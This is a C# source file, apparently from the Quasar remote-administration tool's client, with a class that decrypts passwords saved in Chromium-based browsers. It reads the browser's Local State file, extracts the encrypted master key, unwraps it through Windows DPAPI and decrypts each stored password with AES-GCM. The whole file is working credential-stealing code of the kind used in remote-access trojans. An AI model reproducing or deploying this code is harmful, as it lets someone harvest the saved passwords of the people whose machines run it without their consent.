using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Quasar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// </summary>
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;

        public ChromiumDecryptor(string localStatePath)
        {
            try
            {
                if (File.Exists(localStatePath))
                {
                    string localState = File.ReadAllText(localStatePath);

                    var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
                    var endIndex = localState.IndexOf('"', startIndex + 1);
                    var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);

                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
                        DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
            }
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                if (string.IsNullOrEmpty(cipherText))
                    return "";


                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);

                var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
                var encryptedPassword = cipherTextBytes.Skip(15).ToArray();

                var decryptedPassword = DecryptAesGcm(encryptedPassword, _key, initialisationVector);

                return Encoding.UTF8.GetString(decryptedPassword); ;
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
                return "";
            }
        }

        private byte[] DecryptAesGcm(byte[] encryptedPassword, byte[] key, byte[] nonce)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
            if (encryptedPassword == null || encryptedPassword.Length == 0)
                throw new ArgumentException("Message required!", nameof(encryptedPassword));

            var cipher = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
            cipher.Init(false, parameters);
            var plainText = new byte[cipher.GetOutputSize(encryptedPassword.Length)];
            try
            {
                var len = cipher.ProcessBytes(encryptedPassword, 0, encryptedPassword.Length, plainText, 0);
                cipher.DoFinal(plainText, len);
            }
            catch (InvalidCipherTextException)
            {
                return null;
            }
            return plainText;
        }
    }
}